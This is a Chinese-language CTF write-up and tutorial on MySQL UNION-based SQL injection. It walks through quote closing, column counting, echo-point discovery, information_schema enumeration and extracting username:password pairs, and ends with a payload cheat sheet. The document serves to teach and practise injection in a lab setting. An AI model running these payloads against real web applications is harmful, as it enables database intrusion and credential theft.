## 一句话概括

`UNION` 把「我们构造的 SELECT」拼到「原查询」后面，两条查询的结果一起返回。只要原查询**查不到东西**（把 id 改成 `-1`），页面显示的就是我们的结果，于是可以把任意数据塞进回显位。

## 原理

### 1. UNION 的显示优先级

```sql
SELECT A UNION SELECT B
```

- A 有结果 → 显示 A 的结果；
- A 无结果 → 显示 B 的结果。

所以在 `?id=1' union select 1,2,3 --+` 里，如果 `id=1` 真实存在，页面显示的是「用户 1 的数据」，我们塞的 `1,2,3` 被盖住了。**把 id 换成 `-1`（或任何不存在的值），原查询落空，UNION 的结果才会显示出来**——这就是 payload 里动不动写 `-1'` 的原因。

### 2. 列数必须对齐

UNION 前后两个 SELECT 的列数必须一致，否则报错。先用 `order by` 数出列数，再构造同样数量的占位值。

### 3. 回显点是什么

`union select 1,2,3` 里的 `1,2,3` 会分别落到页面显示该列的三个位置上。哪个数字出现在页面上，哪个位置就是「回显点」，可以把 `database()`、`password` 等替换进去。

> 如果连 `union select` 本身都被 WAF 拦了，说明进入了「过滤绕过」的范畴，处理办法见《过滤绕过-空格与关键字》等篇目。

## 完整攻击流程

### 阶段一：构造闭合并测试注释符

```sql
?id=1' --+
?id=1' #
?id=1' %23
```

验证三件事：
1. **闭合是否成立**：页面正常显示说明 `'` 正确闭合了前面的引号；
2. **注释符是否可用**：`--+` 无效就换 `#` 或 `%23`；
3. **闭合完整性**：再用布尔对比确认。

### 阶段二：布尔验证（确认能控制逻辑）

```sql
?id=1' and '1'='1' --+   → 正常显示（永真）
?id=1' and '1'='2' --+   → 无结果（永假）
```

这一步能一真一假，才说明**闭合正确 + 注释正常 + 逻辑可控**，否则继续往下走是浪费时间。

### 阶段三：探测字段数量

```sql
?id=1' order by 1 --+  (正常)
?id=1' order by 2 --+  (正常)
?id=1' order by 3 --+  (正常)
?id=1' order by 4 --+  (错误)   → 有 3 个字段
```

### 阶段四：定位回显点

```sql
?id=-1' union select 1,2,3 --+
```

观察页面上哪个数字被打印出来，那几个位置就是可用的输出位。

### 阶段五：信息收集

```sql
?id=-1' union select 1,database(),user() --+
?id=-1' union select 1,version(),@@version_compile_os --+
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```

### 阶段六：提取数据

```sql
?id=-1' union select 1,username,password from users --+
?id=-1' union select 1,2,group_concat(username,0x3a,password) from users --+
```

> `0x3a` 是冒号 `:` 的十六进制写法，用来在一条回显里把用户名和密码用 `:` 分隔开，比 `group_concat(username,':',password)` 更不容易踩到引号过滤。

## 本题情景与解题手法

### 题目形态

一道最基础的 union 注入题，页面 URL 形如：

```http
GET /?id=1 HTTP/1.1
Host: 靶机地址
```

输入 `id=1` 返回一行用户信息，输入 `id=abc` 返回空。后端 SQL 是 `select username,password from user where id = '".$_GET['id']."' limit 1;`。

### 第一步：拿到库名

直接贴 payload：

```sql
-1' union select hex('flag'),database() --+
```

回显：

```text
查询库名为 ctfshow_web
```

`hex('flag')` 的作用是把字符串 `flag` 编码成 `666C6167` —— 因为第一个字段在页面上是**用户名列**，如果直接写 `'flag'`，字符串内容会撞上「回显里不能出现 flag」这类过滤；编码成十六进制后，页面上只是一串 `666C6167`，过滤不认识它。`database()` 放在第二个字段（密码列），就把库名打印出来了。

### 第二步：为什么 `group_concat(schema_name) from information_schema.schemata` 能列出所有库

```sql
-1' union select hex('flag'),group_concat(schema_name) from information_schema.schemata--+
```

拆开看：

- `information_schema.schemata`：MySQL 自带的**系统表**，每一行存一个数据库的信息；
- `schema_name`：该表里表示「数据库名」的列；
- `group_concat(...)`：把查到的多行**压成一行**，用逗号连接 —— 因为页面 `limit 1` 只显示一行，不压缩就只能看到第一个库；
- `hex('flag')`：第一列固定显示 `666C6167`，占位用。

它查出来的就是**当前 MySQL 实例下所有数据库的名字**。

### 第三步：这套写法是否通用

通用。原因：

1. `information_schema` 是 MySQL 的标准系统库，任何版本都有；
2. `schemata` / `tables` / `columns` 都是标准系统表；
3. 把 `schemata.schema_name` 换成 `tables.table_name`（配合 `where table_schema=database()`）、`columns.column_name`（配合 `where table_name='xxx'`）就是「库 → 表 → 列」的通用套路。

### 注入手法一句话总结

> **闭合引号 → `-1` 让原查询落空 → `order by` 数清 3 列 → `union select 1,2,3` 找回显点 → 把 `database()` / `information_schema` 的查询塞进回显位 → 用 `group_concat` 压缩多行、用 `hex` 规避输出过滤。**

## Payload 速查

| 目的 | Payload |
|---|---|
| 找列数 | `-1' order by N --+` |
| 找回显点 | `-1' union select 1,2,3 --+` |
| 当前库 / 用户 | `-1' union select 1,database(),user() --+` |
| 版本 / 系统 | `-1' union select 1,version(),@@version_compile_os --+` |
| 所有库 | `-1' union select 1,group_concat(schema_name) from information_schema.schemata --+` |
| 当前库的表 | `-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+` |
| 指定表的列 | `-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+` |
| 取数据（含分隔） | `-1' union select 1,group_concat(username,0x3a,password) from users --+` |

## 踩坑与备注

- **不写 `-1` 就看不到自己的结果**：原查询有数据时，UNION 的结果被盖在下面，页面只显示第一行（`limit 1`）。
- **必须先 `order by` 再 `union`**：列数不对会直接报 `different number of columns`，凭空多一轮试错。
- **多行数据要 `group_concat`**：`limit 1` 的页面只显示一行，不用聚合函数只能拿到第一条。
- **`hex()` 是应对「输出里不能出现某关键字」的常用手段**，配合本地解码即可还原明文；同一思路的 base64 写法是 `to_base64()`。
